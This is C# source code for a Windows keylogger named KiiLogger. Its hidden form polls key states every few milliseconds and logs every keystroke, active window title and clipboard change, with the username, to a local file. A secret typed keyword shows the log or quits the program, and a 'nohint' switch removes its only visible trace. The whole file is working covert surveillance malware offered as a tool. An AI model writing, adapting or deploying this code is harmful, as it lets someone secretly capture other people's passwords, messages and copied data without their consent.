using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using System.Diagnostics;
using System.IO;


namespace Kiilogger
{
    public partial class MainForm : Form
    {

        public MainForm()
        {
            InitializeComponent();
            this.Visible = false;
        }




        #region Variables
        /// <summary>
        /// Path to Log File 
        /// </summary>
        string LogPath;
        /// <summary>
        /// KeyWord for KiiLogger Operations like "stat" to Open Log and "exit" to Exit KiiLogger
        /// </summary>
        string Keyword;
        /// <summary>
        /// Used to write Log to file
        /// </summary>
        StreamWriter LogWriter;
        /// <summary>
        /// Show hints in notepad if Visible
        /// </summary>
        bool mVisible = true;
        /// <summary>
        /// InMemory Log Storage
        /// </summary>
        StringBuilder BufferBuilder;
        /// <summary>
        /// Stores old Clipboard Text for comparison
        /// </summary>
        string OldClipText = string.Empty;
        /// <summary>
        /// Stores Old Winodw Title for Comparison
        /// </summary>
        string OldWindowTitle = string.Empty;
        /// <summary>
        /// Polls for Key Pressed events
        /// </summary>
        Timer KeyTimer;
        /// <summary>
        /// Inappropriate state so close
        /// </summary>
        bool CloseImmediately = false;
        #endregion

        #region Constants

        const int ShiftKeyDownState = -32768;
        const int ShiftKeyCode = 16;
        const int KeyDownState = -32767;

        #endregion


        public MainForm(string[] args)
        {
            InitializeComponent();


            //Debug.Print(System.Threading.Thread.CurrentThread.GetApartmentState().ToString());
            if (args.Length == 0)//No commandline arguments passed. Show what to pass.
            {
                var inifile = Path.GetFileNameWithoutExtension((System.Reflection.Assembly.GetExecutingAssembly().Location)) + ".ini";
                if (!File.Exists(inifile))
                {
                    NotepadWriteLine(@"Pass ""nohint"" and ""path=PathToLogFile"" and ""keyword=keywordForKiilogger"" parameters");
                    CloseImmediately = true;
                    return;
                }
                else
                {
                    args = File.ReadAllLines(inifile);
                }
            }

            bool pathSpecified = false;
            bool keywordSpecified = false;
            foreach (var arg in args)

            {
                if (arg.ToLower() == "nohint")
                {
                    mVisible = false;
                }
                if (arg.ToLower().StartsWith("path=") && arg.Length > 5)
                {
                    pathSpecified = true;
                    LogPath = arg.Substring(5);
                    NotepadWriteLine("Logging to path: " + LogPath);
                }
                else if (arg.ToLower().StartsWith("keyword=") && arg.Length > 7)
                {
                    keywordSpecified = true;
                    Keyword = arg.Substring(8);
                    NotepadWriteLine("Get KiiLogger status: " + Keyword + "stat and Exit using: " + Keyword + "exit");
                }
            }

            if (!pathSpecified)
            {
                LogPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "KiilogX");
                NotepadWriteLine("Path parameter not specified defaulting to: " + LogPath);
            }
            if (!keywordSpecified)
            {
                Keyword = "KiiKey";
                NotepadWriteLine("Keyword parameter not specified defaulting to: " + Keyword + "stat and " + Keyword + "exit");
            }
            LogWriter = new StreamWriter(LogPath, true);
            LogWriter.AutoFlush = true;
            BufferBuilder = new StringBuilder(500);
            BufferBuilder.Append(@"<KiiStart Date=""" + DateTime.Now.ToString() + @"""  User=""" + Environment.UserName + @"""/>");
            KeyTimer = new Timer();
            KeyTimer.Interval = 5;
            KeyTimer.Tick += KeyTimer_Tick;
            KeyTimer.Enabled = true;
            KeyTimer.Start();
            NotepadWriteLine(@"Pass ""nohint"" as first parameter to hide this text in notepad.");

        }





        /// <summary>
        /// Called by KeyTimer on its Tick Event. Used to check which keys are pressed.
        /// </summary>
        /// <param name="state">Not used</param>
        private void KeyTimer_Tick(object sender, EventArgs e)
        {
            //Debug.Print(System.Threading.Thread.CurrentThread.GetApartmentState().ToString());
            int KeyState;
            int ShiftKeyState;
            int KeyCode;
            string currentWindowTitleBuffer = new string('\0', 100);
            NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), currentWindowTitleBuffer, 100);
            currentWindowTitleBuffer = currentWindowTitleBuffer.Substring(0, currentWindowTitleBuffer.IndexOf('\0'));
            if (currentWindowTitleBuffer.Length > 0 && OldWindowTitle != currentWindowTitleBuffer)
            {
                OldWindowTitle = currentWindowTitleBuffer;
                BufferBuilder.Append(Environment.NewLine + @"<App Title=""" + currentWindowTitleBuffer + @"""/>");
                return;
            }
            else
            {
                for (KeyCode = 65; KeyCode <= 90; KeyCode++)
                {
                    KeyState = NativeMethods.GetAsyncKeyState(KeyCode);
                    ShiftKeyState = NativeMethods.GetAsyncKeyState(ShiftKeyCode);
                    if (KeyState == KeyDownState)
                    {
                        if (ShiftKeyState == ShiftKeyDownState)
                        {
                            BufferBuilder.Append(Strings.Chr(KeyCode));
                        }
                        else
                        {
                            BufferBuilder.Append(Strings.Chr(KeyCode + 32));
                        }
                    }
                }
                for (KeyCode = 8; KeyCode <= 222; KeyCode++)
                {

                    if (KeyCode == 65)///Escape Keys 65 to 90. So jump forloop from 65 to 91
                        KeyCode = 91;
                    KeyState = NativeMethods.GetAsyncKeyState(KeyCode);
                    ShiftKeyState = NativeMethods.GetAsyncKeyState(ShiftKeyCode);
                    if (KeyState == KeyDownState)
                    {
                        switch (KeyCode)
                        {
                            case 96:
                            case 97:
                            case 98:
                            case 99:
                            case 100:
                            case 101:
                            case 102:
                            case 103:
                            case 104:
                            case 105:
                                BufferBuilder.Append("[Npad-" + (KeyCode - 96) + ']');
                                break;
                            case 48:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? ')' : '0');
                                break;
                            case 49:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '!' : '1');
                                break;
                            case 50:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '@' : '2');
                                break;
                            case 51:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '#' : '3');
                                break;
                            case 52:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '$' : '4');
                                break;
                            case 53:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '%' : '5');
                                break;
                            case 54:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '^' : '6');
                                break;
                            case 55:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '&' : '7');
                                break;
                            case 56:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '*' : '8');
                                break;
                            case 57:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '(' : '9');
                                break;
                            case 112:
                                BufferBuilder.Append(" F1 ");
                                break;
                            case 113:
                                BufferBuilder.Append(" F2 ");
                                break;
                            case 114:
                                BufferBuilder.Append(" F3 ");
                                break;
                            case 115:
                                BufferBuilder.Append(" F4 ");
                                break;
                            case 116:
                                BufferBuilder.Append(" F5 ");
                                break;
                            case 117:
                                BufferBuilder.Append(" F6 ");
                                break;
                            case 118:
                                BufferBuilder.Append(" F7 ");
                                break;
                            case 119:
                                BufferBuilder.Append(" F8 ");
                                break;
                            case 120:
                                BufferBuilder.Append(" F9 ");
                                break;
                            case 121:
                                BufferBuilder.Append(" F10 ");
                                break;
                            case 122:
                                BufferBuilder.Append(" F11 ");
                                break;
                            case 123:
                                BufferBuilder.Append(" F12 ");
                                break;
                            case 220:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '|' : '\\');
                                break;
                            case 188:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '<' : ',');
                                break;
                            case 189:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '_' : '-');
                                break;
                            case 190:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '>' : '.');
                                break;
                            case 191:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '?' : '/');
                                break;
                            case 187:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '+' : '=');
                                break;
                            case 186:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? ':' : ';');
                                break;
                            case 222:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '"' : '\'');
                                break;
                            case 219:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '{' : '[');
                                break;
                            case 221:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '}' : ']');
                                break;
                            case 192:
                                BufferBuilder.Append(ShiftKeyState == ShiftKeyDownState ? '~' : '`');
                                break;
                            case 8:
                                BufferBuilder.Append("[Bksp]");
                                break;
                            case 9:
                                BufferBuilder.Append("[Tab]");
                                break;
                            case 13:
                                BufferBuilder.Append(Environment.NewLine);
                                break;
                            case 17:
                                BufferBuilder.Append("[Ctrl]");
                                break;
                            case 18:
                                BufferBuilder.Append("[Alt]");
                                break;
                            case 19:
                                BufferBuilder.Append("[Pause]");
                                break;
                            case 20:
                                BufferBuilder.Append("[Cpslck]");
                                break;
                            case 27:
                                BufferBuilder.Append("[Esc]");
                                break;
                            case 32:
                                BufferBuilder.Append("[Spc]");
                                break;
                            case 33:
                                BufferBuilder.Append("[PgUp]");
                                break;
                            case 34:
                                BufferBuilder.Append("[PgDn]");
                                break;
                            case 35:
                                BufferBuilder.Append("[End]");
                                break;
                            case 36:
                                BufferBuilder.Append("[Home]");
                                break;
                            case 37:
                                BufferBuilder.Append("[←]");
                                break;
                            case 38:
                                BufferBuilder.Append("[↑]");
                                break;
                            case 39:
                                BufferBuilder.Append("[→]");
                                break;
                            case 40:
                                BufferBuilder.Append("[↓]");
                                break;
                            case 41:
                                BufferBuilder.Append("[Sel]");
                                break;
                            case 43:
                                BufferBuilder.Append("[Exec]");
                                break;
                            case 44:
                                BufferBuilder.Append("[PrtScr]");
                                break;
                            case 45:
                                BufferBuilder.Append("[Ins]");
                                break;
                            case 46:
                                BufferBuilder.Append("[Del]");
                                break;
                            case 47:
                                BufferBuilder.Append("[Help]");
                                break;
                            case 109:
                                BufferBuilder.Append("[N-]");
                                break;
                            case 106:
                                BufferBuilder.Append("[N*]");
                                break;
                            case 107:
                                BufferBuilder.Append("[N+]");
                                break;
                            case 111:
                                BufferBuilder.Append("[N/]");
                                break;
                            case 110:
                                BufferBuilder.Append("[N.]");
                                break;
                            case 91:
                            case 92:
                                BufferBuilder.Append("[Win]");
                                break;
                            case 2:
                                BufferBuilder.Append("[RMB]");
                                break;
                            case 1:
                                BufferBuilder.Append("[LMB]");
                                break;
                            case 4:
                                BufferBuilder.Append("[MMB]");
                                break;
                        }
                    }
                }
            }

            if (BufferBuilder.ToString().Contains(Keyword + "stat"))
            {
                Debug.Print("stat");
                LogToFile(BufferBuilder.ToString());
                BufferBuilder.Clear();
                Process.Start("notepad.exe", LogPath);
            }
            if (BufferBuilder.ToString().Contains(Keyword + "exit"))
            {
                KeyTimer.Stop();
                Console.Beep();
                Console.Beep();
                Console.Beep();
                LogToFile(BufferBuilder.ToString());
                BufferBuilder.Clear();
                Close();
            }

            if (Clipboard.ContainsText())
            {
                var currentClipText = Clipboard.GetText();
                if (currentClipText != OldClipText)
                {
                    OldClipText = currentClipText;
                    BufferBuilder.Append(Environment.NewLine + "<Clip><![CDATA[" + currentClipText + "]]></Clip>");
                }
            }
            // if BufferBuilder contains more than 400 characters then write to LogFile
            if (BufferBuilder.Length > 400)
            {
                LogToFile(BufferBuilder.ToString());
                BufferBuilder.Clear();
            }
        }

        private void LogToFile(string bufferText)
        {
            LogWriter.WriteLine(bufferText);
        }

        private void NotepadWriteLine(string bufferText)
        {
            if (mVisible)
            {
                Process p = Process.GetProcessesByName("notepad").FirstOrDefault();
                if (p == null)
                {
                    p = Process.Start("notepad.exe");
                    p.WaitForInputIdle();
                }
                IntPtr h = p.MainWindowHandle;
                NativeMethods.SetForegroundWindow(h);
                SendKeys.SendWait(bufferText + Environment.NewLine);
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            Hide();
            if (CloseImmediately)
                Close();
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (BufferBuilder != null)
            {
                BufferBuilder.Append(@"<KiiStop Date=""" + DateTime.Now.ToString() + @"""  User=""" + Environment.UserName + @"""/>");
                LogToFile(BufferBuilder.ToString());
                BufferBuilder.Clear();
                KeyTimer.Stop();
                LogWriter.Dispose();
            }
        }
    }


    static class NativeMethods
    {
        #region WinAPIs
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        internal static extern short GetAsyncKeyState(int vkey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, String lpString, int nMaxCount);

        [DllImport("User32.dll")]
        internal static extern int SetForegroundWindow(IntPtr point);
        #endregion
    }
}
